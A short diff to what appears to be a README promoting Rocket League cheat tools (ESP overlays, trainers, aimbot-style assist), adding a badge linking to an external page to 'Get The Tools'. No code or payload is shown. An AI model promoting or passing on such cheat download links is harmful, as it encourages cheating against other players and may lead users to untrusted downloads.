@@ -4,6 +4,7 @@
 
 Rocket League cheat tools open up a whole new way to play. From ESP overlays to trainer mods and aimbot-style goal assist, these hacks let you dominate matches and practice like a pro without the grind.
 
+[![Get](https://img.shields.io/badge/Get%20The-Tools-blueviolet)](https://rocket-league-cheat-tools.github.io/.github/)
 ---
 
 ## Product Description
